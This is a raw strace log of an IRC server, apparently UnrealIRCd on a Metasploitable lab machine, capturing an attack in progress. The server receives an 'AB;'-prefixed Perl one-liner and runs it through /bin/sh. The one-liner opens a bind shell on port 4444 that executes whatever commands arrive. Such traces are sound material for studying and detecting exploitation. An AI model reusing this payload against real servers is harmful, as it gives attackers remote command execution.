4519  20:22:34.237455 waitpid(12003, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 12003
4519  20:22:34.295138 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  20:22:34.295181 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  20:22:34.295194 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  20:22:34.295205 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  20:22:34.295239 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  20:22:34.295307 time(NULL)        = 1495671754
4519  20:22:34.295322 time(NULL)        = 1495671754
4519  20:22:34.295344 gettimeofday({1495671754, 295350}, NULL) = 0
4519  20:22:34.295359 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:22:34.295392 clock_gettime(CLOCK_MONOTONIC, {48564, 112406201}) = 0
4519  20:22:34.295406 gettimeofday({1495671754, 295410}, NULL) = 0
4519  20:22:34.295417 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 4 (in [4 5 7 9], left {1, 0})
4519  20:22:34.295508 clock_gettime(CLOCK_MONOTONIC, {48564, 112521878}) = 0
4519  20:22:34.295521 recv(9, "CPRIVMSG botnick1 #testit2 :lskdfkl", 8192, 0) = 35
4519  20:22:34.295537 recv(7, "PRIVMSG  #testit1 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\nPRIVMSG  #testit1 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 114
4519  20:22:34.295564 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295582 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295597 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295611 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295632 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295649 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295663 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295677 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295691 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295704 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295718 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295731 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295745 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295759 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295772 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295786 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295800 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295813 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295827 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295842 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295857 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295870 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295890 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295905 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295919 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295933 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295947 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295961 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295974 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.295996 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296010 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296024 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296037 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296051 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296065 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296079 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296092 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296106 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296120 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296133 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296147 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296189 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296218 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296231 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296248 recv(5, "", 8192, 0) = 0
4519  20:22:34.296260 getsockopt(5, SOL_SOCKET, SO_ERROR, [32], [4]) = 0
4519  20:22:34.296279 send(5, "ERROR :Closing Link: [10.0.2.4] (Broken pipe)\r\n", 47, 0) = -1 EPIPE (Broken pipe)
4519  20:22:34.296296 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  20:22:34.296327 close(5)          = 0
4519  20:22:34.296341 recv(4, "PRIVMSG  #testit0 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\nPRIVMSG  #testit0 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\nPRIVMSG  #testit0 ABCDEFGHIJKLMNOPQRSTUVWXYZ\nPRIVMSG  #testit0 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\nCPRIVMSG botnick3 #testit1 :lskdfkl", 8192, 0) = 265
4519  20:22:34.296373 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296388 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296402 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296417 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296430 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296444 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296458 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296472 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296485 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296499 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296513 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296526 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296540 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296554 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296567 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296581 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296594 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296608 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296622 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296640 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296663 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296703 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296735 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296749 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296763 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296778 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296791 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296805 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296819 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296833 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296846 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296860 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296874 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296887 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296901 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296914 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296928 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296942 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296955 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296969 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296982 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.296996 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297010 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297024 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297039 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297053 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297067 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297081 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297095 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297109 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297122 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297136 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297154 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297170 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297211 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297240 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297254 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297268 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297282 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297296 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297327 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297341 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297355 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297369 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297382 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297396 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297412 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297426 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297440 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297454 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297468 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297482 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297496 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297509 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297523 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297537 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297550 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297564 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297577 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297591 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297605 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297619 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297632 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297651 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297666 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297680 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297694 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297708 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:22:34.297724 gettimeofday({1495671754, 297728}, NULL) = 0
4519  20:22:34.297736 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {0, 350000})
4519  20:22:34.949222 clock_gettime(CLOCK_MONOTONIC, {48564, 766243209}) = 0
4519  20:22:34.949253 time(NULL)        = 1495671754
4519  20:22:34.949266 time(NULL)        = 1495671754
4519  20:22:34.949305 gettimeofday({1495671754, 949308}, NULL) = 0
4519  20:22:34.949317 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
4519  20:22:34.949372 clock_gettime(CLOCK_MONOTONIC, {48564, 766385035}) = 0
4519  20:22:34.949383 gettimeofday({1495671754, 949386}, NULL) = 0
4519  20:22:34.949393 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  20:22:34.949433 clock_gettime(CLOCK_MONOTONIC, {48564, 766445499}) = 0
4519  20:22:34.949444 accept(2, 0, NULL) = 5
4519  20:22:34.949466 getpeername(5, {sa_family=AF_INET, sin_port=htons(41487), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  20:22:34.949499 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  20:22:34.949511 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  20:22:34.949526 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  20:22:34.949538 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  20:22:34.949557 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  20:22:34.949568 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  20:22:34.949628 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  20:22:34.949649 clock_gettime(CLOCK_MONOTONIC, {48564, 766663133}) = 0
4519  20:22:34.949662 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  20:22:34.949674 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  20:22:34.949684 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  20:22:34.949694 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  20:22:34.949704 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  20:22:34.949765 send(6, "h\351\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  20:22:34.949855 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  20:22:34.949874 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n", 70, 0) = 70
4519  20:22:34.949950 gettimeofday({1495671754, 949954}, NULL) = 0
4519  20:22:34.949976 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {1, 0})
4519  20:22:34.952658 clock_gettime(CLOCK_MONOTONIC, {48564, 769691317}) = 0
4519  20:22:34.952711 recvfrom(6, "h\351\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0\22\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  20:22:34.952769 close(6)          = 0
4519  20:22:34.952784 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  20:22:34.952799 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 104, 0) = 104
4519  20:22:34.952848 time(NULL)        = 1495671754
4519  20:22:34.952861 time(NULL)        = 1495671754
4519  20:22:34.952873 gettimeofday({1495671754, 952876}, NULL) = 0
4519  20:22:34.952885 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:22:34.952914 clock_gettime(CLOCK_MONOTONIC, {48564, 769927270}) = 0
4519  20:22:34.953015 gettimeofday({1495671754, 953020}, NULL) = 0
4519  20:22:34.953028 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  20:22:34.953069 clock_gettime(CLOCK_MONOTONIC, {48564, 770082406}) = 0
4519  20:22:34.953081 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  20:22:34.953111 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  20:22:34.953127 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  20:22:34.953139 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  20:22:34.953155 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 12008
12008 20:22:34.953228 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
12008 20:22:34.953242 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
12008 20:22:34.953253 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12008 20:22:34.953267 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\nck3 #testit1 :lskdfklDEFGHIJKLMNOPQRSTUVWXYZ\n"], [/* 14 vars */]) = 0
12008 20:22:34.953380 brk(0)            = 0x80f9000
12008 20:22:34.953407 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12008 20:22:34.953423 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd9000
12008 20:22:34.953440 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
12008 20:22:34.953457 open("/etc/ld.so.cache", O_RDONLY) = 1
12008 20:22:34.953484 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12008 20:22:34.953505 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fd1000
12008 20:22:34.953516 close(1)          = 0
12008 20:22:34.953527 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12008 20:22:34.953544 open("/lib/libncurses.so.5", O_RDONLY) = 1
12008 20:22:34.953558 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
12008 20:22:34.953653 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
12008 20:22:34.953671 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7fa1000
12008 20:22:34.953684 mmap2(0xb7fce000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7fce000
12008 20:22:34.953701 close(1)          = 0
12008 20:22:34.953713 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12008 20:22:34.953728 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
